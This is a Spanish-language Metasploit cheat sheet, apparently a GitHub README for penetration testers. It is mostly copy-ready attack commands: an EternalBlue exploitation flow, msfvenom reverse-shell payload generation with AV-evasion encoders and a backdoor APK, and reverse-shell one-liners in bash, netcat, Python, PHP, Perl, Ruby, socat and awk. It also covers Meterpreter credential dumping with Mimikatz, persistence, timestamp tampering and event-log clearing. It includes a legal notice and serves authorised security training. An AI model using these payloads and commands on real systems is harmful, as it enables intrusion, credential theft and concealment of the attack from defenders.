<div align="center">

# 💥 Offensive Security
### Metasploit Framework — Explotación & Post-Explotación

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Exploitation-ff6b00?style=for-the-badge&logo=hackthebox&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-00d4ff?style=for-the-badge&logo=linux&logoColor=white)

</div>

---

> **¿Qué es Metasploit?**
> Framework de explotación open-source con +2000 exploits, +500 payloads y +1000 módulos auxiliares. Permite automatizar el ciclo completo: escaneo → explotación → post-explotación.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🗂️ Resumen de Módulos](#️-resumen-de-módulos) |
| 02 | [🖥️ msfconsole — Comandos Esenciales](#️-msfconsole--comandos-esenciales) |
| 03 | [🗄️ Base de Datos & Workspaces](#️-base-de-datos--workspaces) |
| 04 | [🎯 Flujo de Ataque Completo](#-flujo-de-ataque-completo) |
| 05 | [💣 msfvenom — Generación de Payloads](#-msfvenom--generación-de-payloads) |
| 06 | [🐚 Reverse Shells Manuales](#-reverse-shells-manuales) |
| 07 | [🖱️ Meterpreter — Post-Explotación](#️-meterpreter--post-explotación) |
| 08 | [📦 Módulos Post-Explotación](#-módulos-post-explotación) |
| 09 | [🔍 Módulos Auxiliares / Scanners](#-módulos-auxiliares--scanners) |
| 10 | [⬆️ Upgrade de Shell](#️-upgrade-de-shell) |
| 11 | [📊 Recapitulación](#-recapitulación) |

---

## 🗂️ Resumen de Módulos

| Tipo | Cantidad | Uso |
|------|----------|-----|
| **Exploits** | ~2000 | Aprovechar vulnerabilidades para ganar acceso |
| **Payloads** | ~500 | Código ejecutado tras explotación exitosa |
| **Auxiliares** | ~1000 | Escaneo, fuzzing, sniffing, DoS |
| **Post** | ~400 | Escalada, pivoting, exfiltración post-acceso |
| **Encoders** | ~40 | Ofuscación de payloads para evasión AV |
| **NOPs** | ~10 | Relleno para exploits de buffer overflow |

---

## 🖥️ msfconsole — Comandos Esenciales

![Tool](https://img.shields.io/badge/Tool-msfconsole-ff3c6e?style=flat-square&logo=linux&logoColor=white)

### `[01]` Navegación y Búsqueda

```bash
msfconsole                          # Iniciar framework
msfconsole -q                       # Sin banner
msfconsole -r script.rc             # Ejecutar resource script

help                                # Ayuda general
help <comando>                      # Ayuda específica
search <término>                    # Buscar módulo por nombre/CVE
search type:exploit platform:windows # Búsqueda filtrada
use <módulo>                        # Seleccionar módulo
use 0                               # Seleccionar por número de resultado
back                                # Volver al menú principal
info                                # Info del módulo activo
```

### `[02]` Configuración de Opciones

```bash
show options                        # Ver opciones del módulo
show advanced                       # Opciones avanzadas
show payloads                       # Payloads compatibles
show targets                        # Targets disponibles

set RHOSTS <IP>                     # IP objetivo
set RPORT <puerto>                  # Puerto objetivo
set LHOST <IP>                      # IP atacante (listener)
set LPORT <puerto>                  # Puerto listener
set PAYLOAD <payload>               # Definir payload
set TARGET <número>                 # Seleccionar target
setg <opción> <valor>               # Configurar global (persiste entre módulos)
unset <opción>                      # Limpiar opción
unsetg <opción>                     # Limpiar opción global
```

### `[03]` Ejecución

```bash
check                               # Verificar si target es vulnerable (si disponible)
exploit                             # Lanzar exploit
run                                 # Alias de exploit
exploit -j                          # Ejecutar en background (job)
exploit -z                          # Ejecutar sin interactuar con sesión
jobs                                # Ver jobs en background
jobs -k <id>                        # Matar job
```

### `[04]` Gestión de Sesiones

```bash
sessions                            # Listar sesiones activas
sessions -l                         # Listar detallado
sessions -i <id>                    # Interactuar con sesión
sessions -k <id>                    # Matar sesión
sessions -K                         # Matar todas
sessions -u <id>                    # Upgrade shell → meterpreter
sessions -c "<cmd>"                 # Ejecutar comando en todas las sesiones
background                          # Enviar sesión a background (desde meterpreter)
```

---

## 🗄️ Base de Datos & Workspaces

![Tool](https://img.shields.io/badge/Tool-PostgreSQL-336791?style=flat-square&logo=postgresql&logoColor=white)

```bash
# Iniciar base de datos
msfdb init
msfdb start
msfdb status

# Conectar
db_connect msf:password@127.0.0.1/msf
db_status
db_disconnect

# Importar resultados Nmap
db_nmap -sV -O <target>
db_import nmap_results.xml

# Workspaces
workspace                           # Ver workspaces
workspace -a <nombre>               # Crear workspace
workspace <nombre>                  # Cambiar workspace
workspace -d <nombre>               # Eliminar workspace
workspace -r <old> <new>            # Renombrar

# Hosts y Servicios
hosts                               # Listar hosts descubiertos
hosts -a <IP>                       # Agregar host
hosts -S <búsqueda>                 # Buscar host
services                            # Listar servicios
services -p <puerto>                # Filtrar por puerto
services -s <servicio>              # Filtrar por nombre
vulns                               # Listar vulnerabilidades encontradas
```

---

## 🎯 Flujo de Ataque Completo

### `[01]` Ejemplo — EternalBlue (MS17-010)

```bash
# 1. Verificar vulnerabilidad
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.0/24
run

# 2. Explotar
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
exploit
```

### `[02]` Ejemplo — Multi/Handler (listener genérico)

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
exploit -j                          # Escuchar en background
```

> [!TIP]
> Guardar como resource script para reusar: `make_rc` o `save` en msfconsole.

### `[03]` Resource Script Reutilizable

```bash
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

```bash
msfconsole -r handler.rc
```

---

## 💣 msfvenom — Generación de Payloads

![Tool](https://img.shields.io/badge/Tool-msfvenom-ff6b00?style=flat-square&logo=linux&logoColor=white)

**Sintaxis base:**
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT>
```

### `[01]` Payloads Windows

```bash
# x86 — Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# x64 — Reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell64.exe

# HTTPS (evasión)
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell_https.exe

# Bind (objetivo se conecta a sí mismo)
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe

# Con encoder (evasión AV básica)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

### `[02]` Payloads Linux

```bash
# x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell64.elf

# Shell simple x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o simple.elf
```

### `[03]` Payloads Web

```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# ASP (IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
```

### `[04]` Payloads Script / Mobile

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh -o shell.ps1

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=4444 -f raw -o shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=4444 -f raw -o shell.pl

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -o backdoor.apk
```

### `[05]` Referencia de Formatos

| Flag `-f` | Uso |
|-----------|-----|
| `exe` | Windows ejecutable |
| `elf` | Linux ejecutable |
| `raw` | Shellcode raw / scripts |
| `asp` / `aspx` | IIS web shell |
| `war` | Java web archive |
| `psh` | PowerShell |
| `hta-psh` | HTA + PowerShell |
| `vba` | Macro Office |
| `macho` | macOS ejecutable |

---

## 🐚 Reverse Shells Manuales

![Tool](https://img.shields.io/badge/Tool-Reverse%20Shells-a855f7?style=flat-square)

> [!NOTE]
> Útiles cuando no hay Metasploit disponible o se busca footprint mínimo.

### `[01]` Linux — One-Liners

```bash
# Bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'

# Netcat (con -e)
nc -e /bin/sh <LHOST> <LPORT>

# Netcat (sin -e — mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> >/tmp/f

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat (shell interactiva completa)
socat TCP4:<LHOST>:<LPORT> EXEC:bash,pty,stderr,setsid,sigint,sane

# AWK
awk 'BEGIN {s="/inet/tcp/0/<LHOST>/<LPORT>";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c);}}while(c!="exit")close(s)}}' /dev/null
```

### `[02]` Listener

```bash
nc -nvlp <LPORT>                    # Netcat listener básico
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>   # Listener TTY completa
```

---

## 🖱️ Meterpreter — Post-Explotación

![Tool](https://img.shields.io/badge/Tool-Meterpreter-00d4ff?style=flat-square)

### `[01]` Sistema e Información

```bash
sysinfo                             # Info del sistema objetivo
getuid                              # Usuario actual
getpid                              # PID del proceso meterpreter
ps                                  # Lista procesos
migrate <PID>                       # Migrar a otro proceso
kill <PID>                          # Matar proceso
```

### `[02]` Navegación de Archivos

```bash
pwd                                 # Directorio actual
ls                                  # Listar archivos
cd <ruta>                           # Cambiar directorio
cat <archivo>                       # Leer archivo
download <archivo>                  # Descargar archivo al atacante
upload <local> <remoto>             # Subir archivo al objetivo
edit <archivo>                      # Editar archivo
search -f <patrón>                  # Buscar archivos (ej: *.txt)
```

### `[03]` Shell & Escalada

```bash
shell                               # Obtener shell del SO
execute -f cmd.exe -i               # Ejecutar proceso interactivo
getsystem                           # Intentar escalar a SYSTEM
getsystem -t 1                      # Técnica específica de escalada
getuid                              # Verificar si se escaló
run post/windows/escalate/getsystem
```

### `[04]` Red & Pivoting

```bash
ipconfig / ifconfig                 # Interfaces de red
arp                                 # Tabla ARP
route                               # Tabla de rutas
portfwd add -l 3389 -p 3389 -r <IP_INTERNA>   # Port forwarding
run post/multi/manage/shell_to_meterpreter     # Upgrade shell
```

### `[05]` Credenciales & Hashes

```bash
hashdump                            # Dump de hashes SAM (requiere SYSTEM)
run post/windows/gather/smart_hashdump         # Dump inteligente
run post/windows/gather/credentials/credential_collector
load kiwi                           # Cargar Mimikatz
creds_all                           # Dumpar todas las credenciales
lsa_dump_sam                        # SAM dump vía kiwi
lsa_dump_secrets                    # Secretos LSA
```

### `[06]` Persistencia & Limpieza

```bash
run post/windows/manage/persistence_exe       # Persistencia via EXE
run post/windows/manage/persistence           # Persistencia registro
timestomp <archivo> -z              # Modificar timestamps
clearev                             # Borrar logs de eventos Windows
```

---

## 📦 Módulos Post-Explotación

| Módulo | Descripción |
|--------|-------------|
| `post/multi/recon/local_exploit_suggester` | Sugiere exploits de escalada local |
| `post/windows/gather/enum_system` | Enumera info del sistema |
| `post/windows/gather/enum_logged_on_users` | Usuarios con sesión activa |
| `post/windows/gather/hashdump` | Dump de hashes SAM |
| `post/windows/gather/checkvm` | Detectar si es VM |
| `post/windows/escalate/getsystem` | Escalada a SYSTEM |
| `post/windows/manage/persistence_exe` | Persistencia via EXE |
| `post/multi/manage/shell_to_meterpreter` | Upgrade de shell |

---

## 🔍 Módulos Auxiliares / Scanners

| Módulo | Descripción |
|--------|-------------|
| `auxiliary/scanner/portscan/syn` | SYN scan |
| `auxiliary/scanner/portscan/tcp` | TCP scan |
| `auxiliary/scanner/smb/smb_version` | Versión SMB |
| `auxiliary/scanner/smb/smb_enumshares` | Enumerar shares SMB |
| `auxiliary/scanner/smb/smb_ms17_010` | Detectar EternalBlue |
| `auxiliary/scanner/smb/smb_login` | Brute force SMB |
| `auxiliary/scanner/ssh/ssh_version` | Versión SSH |
| `auxiliary/scanner/ssh/ssh_login` | Brute force SSH |
| `auxiliary/scanner/ftp/ftp_login` | Brute force FTP |
| `auxiliary/scanner/http/dir_scanner` | Enumeración directorios web |
| `auxiliary/scanner/http/http_version` | Versión servidor HTTP |
| `auxiliary/sniffer/psnuffle` | Sniffer de credenciales |

---

## ⬆️ Upgrade de Shell

> [!IMPORTANT]
> Shell básica (nc/bash) = no interactiva. Sin tab completion, sin ctrl+c, sin vim. Siempre upgradar.

### `[01]` Python PTY (más común)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# o
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# En el atacante — tras CTRL+Z
stty raw -echo; fg
# En la shell
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 38 columns 116
reset
```

### `[02]` Script

```bash
script /dev/null -qc /bin/bash
# Luego en atacante: CTRL+Z → stty raw -echo; fg → reset
```

### `[03]` Socat (TTY completa)

```bash
# Atacante
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Víctima
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
```

---

## 📊 Recapitulación

```
🔍 RECON          💣 EXPLOIT          🖱️ POST-EXPLOT
─────────         ─────────           ──────────────
db_nmap     ──►  use exploit    ──►  meterpreter
smb_scan         set options         hashdump
ssh_login        exploit -j          getsystem
                 sessions -i         persistence
                                     clearev
```

| Fase | Herramienta | Comando clave |
|------|-------------|--------------|
| Payload gen | msfvenom | `-p <payload> -f <format>` |
| Listener | multi/handler | `exploit -j` |
| Shell upgrade | python/socat | `pty.spawn("/bin/bash")` |
| Hash dump | kiwi / hashdump | `creds_all` |
| Escalada | local_exploit_suggester | `run post/multi/recon/...` |
